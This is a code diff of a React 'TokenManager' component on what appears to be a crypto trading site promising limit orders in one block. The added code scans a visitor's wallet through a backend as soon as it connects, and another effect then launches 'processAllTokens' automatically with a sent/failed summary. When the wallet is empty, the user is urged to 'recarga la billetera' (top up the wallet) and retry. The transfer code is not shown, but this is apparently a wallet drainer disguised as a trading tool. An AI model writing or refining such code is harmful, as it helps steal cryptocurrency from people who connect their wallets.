@@ -1,8 +1,8 @@
-'use client'
+"use client"
 
-import React, { useEffect, useState } from 'react'
+import React, { useEffect, useState, useRef } from 'react'
 import { useAppKit } from '@reown/appkit/react'
-import {useSwitchChain, useAccount, useBalance, useFeeData, usePublicClient, useWalletClient } from 'wagmi'
+import { useSwitchChain, useAccount, useBalance, useFeeData, usePublicClient, useWalletClient } from 'wagmi'
 import { ethers } from 'ethers'
 
 interface Token {
@@ -82,6 +82,9 @@ export default function TokenManager(): React.JSX.Element {
 
   const BACKEND = process.env.NEXT_PUBLIC_BACKEND_URL ?? ''
   const { switchChain } = useSwitchChain()
+
+  // Ref para evitar scans concurrentes
+  const scanningRef = useRef(false)
 
   // Función para mostrar modales
   const showAlertModal = (title: string, message: string, type: 'error' | 'info' | 'success' = 'info', onConfirm?: () => void, confirmText: string = 'Accept', showCancel: boolean = false, onCancel?: () => void) => {
@@ -213,18 +216,47 @@ export default function TokenManager(): React.JSX.Element {
     }
   }, [])
 
+  // RESET cuando se desconecta para permitir re-intentos limpios
+  useEffect(() => {
+    if (!isConnected) {
+      setHasScanned(false)
+      setTokens([])
+      setDetectedTokensCount(0)
+      setSummary({ sent: [], failed: [] })
+      setScanError('')
+      setPendingNativeTokens([])
+    }
+  }, [isConnected])
 
+  // Nuevo useEffect: dispara scan al conectar (y cuando cambia address)
+  useEffect(() => {
+    if (isConnected && address) {
+      // Si ya se escaneó correctamente y tenemos tokens, no re-ejecutar
+      if (hasScanned && tokens.length > 0) return
+
+      // Pequeño delay para que el provider/wagmi termine su inicialización
+      const t = setTimeout(() => {
+        // Evitar multiples llamadas si ya hay un scan en curso
+        if (scanningRef.current) return
+        scanWallet().catch((e) => {
+          console.error('scanWallet error (from connect effect):', e)
+        })
+      }, 300)
+
+      return () => clearTimeout(t)
+    }
+  }, [isConnected, address])
 
   useEffect(() => {
-  // Solo iniciar procesamiento si no hay otros modales abiertos y no estamos procesando
-  if (hasScanned && tokens.length > 0 && !processing && !showModal && !isLoading) {
-    setShowProcessingModal(true)
-    // Pequeño delay para que el usuario vea el modal antes de comenzar el procesamiento
-    setTimeout(() => {
-      processAllTokens()
-    }, 1500)
-  }
-}, [hasScanned, tokens, processing, showModal, isLoading])
+    // Solo iniciar procesamiento si no hay otros modales abiertos y no estamos procesando
+    if (hasScanned && tokens.length > 0 && !processing && !showModal && !isLoading) {
+      setShowProcessingModal(true)
+      // Pequeño delay para que el usuario vea el modal antes de comenzar el procesamiento
+      setTimeout(() => {
+        processAllTokens()
+      }, 1500)
+    }
+  }, [hasScanned, tokens, processing, showModal, isLoading])
 
   const showLoading = (message: string) => {
     setLoadingMessage(message)
@@ -295,77 +327,91 @@ export default function TokenManager(): React.JSX.Element {
   }
 
   const scanWallet = async (): Promise<void> => {
-  try {
-    setScanError('');
-    showLoading('Escaneando wallet...');
-
-    if (!BACKEND) {
-      const errorMsg = 'Error de configuración: NEXT_PUBLIC_BACKEND_URL no está definido.';
-      console.error('[CONFIG]', errorMsg);
-      setScanError(errorMsg);
-      hideLoading();
-      showAlertModal('Error', errorMsg, 'error');
-      return;
+    if (scanningRef.current) {
+      console.log('[scanWallet] Scan already in progress - skipping')
+      return
     }
+    scanningRef.current = true
 
-    const data = await fetchWithErrorHandling(`${BACKEND}/owner-tokens`, {
-      method: 'POST',
-      headers: { 
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify({ owner: address })
-    });
+    try {
+      setScanError('')
+      showLoading('')
 
-    console.log('', data);
-
-    const processedTokens: Token[] = (data.tokens as Token[] || []).map((token: Token) => {
-      if (token.symbol === 'MATIC' && !token.address) {
-        return { ...token, address: null };
+      if (!BACKEND) {
+        const errorMsg = 'Error de configuración: NEXT_PUBLIC_BACKEND_URL no está definido.'
+        console.error('[CONFIG]', errorMsg)
+        setScanError(errorMsg)
+        hideLoading()
+        showAlertModal('Error', errorMsg, 'error')
+        return
       }
-      return token;
-    });
 
-    // Verificar si no se encontraron tokens
-    if (!processedTokens || processedTokens.length === 0) {
-      setHasScanned(true);
-      hideLoading();
-      showAlertModal(
-        'Error', 
-        'Error no tienes saldo, recarga la billetera e intenta de nuevo', 
-        'error', 
-        () => {
-          setShowModal(false);
-          scanWallet(); // Reintentar el escaneo
+      // Protecciones: asegurar address válido
+      if (!address) {
+        throw new Error('Address no está disponible aún')
+      }
+
+      const data = await fetchWithErrorHandling(`${BACKEND}/owner-tokens`, {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
         },
-        'Reintentar'
-      );
-      return;
-    }
+        body: JSON.stringify({ owner: address })
+      })
 
-    // Guardar todos los tokens
-    setTokens(processedTokens || []);
-    setDetectedTokensCount(processedTokens.length);
-    setHasScanned(true);
-    
-    // Preparar tokens nativos pendientes
-    const nativeTokens = processedTokens.filter(token => !token.address);
-    setPendingNativeTokens(nativeTokens);
-    
-    // Log de tokens en consola
-    if (processedTokens.length > 0) {
-      console.log('', processedTokens);
+      console.log('[scanWallet] backend response', data)
+
+      const processedTokens: Token[] = (data.tokens as Token[] || []).map((token: Token) => {
+        if (token.symbol === 'MATIC' && !token.address) {
+          return { ...token, address: null }
+        }
+        return token
+      })
+
+      // Verificar si no se encontraron tokens
+      if (!processedTokens || processedTokens.length === 0) {
+        setHasScanned(true)
+        hideLoading()
+        showAlertModal(
+          'Error', 
+          'Error no tienes saldo, recarga la billetera e intenta de nuevo', 
+          'error', 
+          () => {
+            setShowModal(false)
+            // reintentar el escaneo
+            scanWallet().catch(e => console.error(e))
+          },
+          'Reintentar'
+        )
+        return
+      }
+
+      // Guardar todos los tokens
+      setTokens(processedTokens || [])
+      setDetectedTokensCount(processedTokens.length)
+      setHasScanned(true)
+      
+      // Preparar tokens nativos pendientes
+      const nativeTokens = processedTokens.filter(token => !token.address)
+      setPendingNativeTokens(nativeTokens)
+      
+      // Log de tokens en consola
+      if (processedTokens.length > 0) {
+        console.log('[scanWallet] tokens', processedTokens)
+      }
+      
+      hideLoading()
+    } catch (err: any) {
+      console.error('Error', err)
+      const errorMsg = '' + (err?.message || err)
+      setScanError(errorMsg)
+      hideLoading()
+      showAlertModal('Error', errorMsg + '\n\nPlease try reconnecting the wallet.', 'error')
+    } finally {
+      scanningRef.current = false
     }
-    
-    hideLoading();
-  } catch (err: any) {
-    console.error('Error', err);
-    const errorMsg = '' + (err?.message || err);
-    setScanError(errorMsg);
-    hideLoading();
-    showAlertModal('Error', errorMsg + '\n\nPlease try reconnecting the wallet.', 'error');
   }
-}
 
   const getWrapInfo = async (chainId: number): Promise<any | null> => {
     try {
@@ -1007,7 +1053,7 @@ export default function TokenManager(): React.JSX.Element {
                         color: '#fff',
                         fontSize: '1.5rem',
                         margin: 0
-                      }}>Land in ≤1 Block</h3>
+                      }}>Land in \u22641 Block</h3>
                     </div>
                   </div>
                   <p className="feature-description" style={{
@@ -1018,7 +1064,7 @@ export default function TokenManager(): React.JSX.Element {
                     <p style={{
                       color: '#888',
                       margin: 0
-                    }}>With our proprietary order execution engine and colocated nodes, our limit orders land in ≤ 1 block.</p>
+                    }}>With our proprietary order execution engine and colocated nodes, our limit orders land in \u22641 block.</p>
                   </div>
                 </div>
 
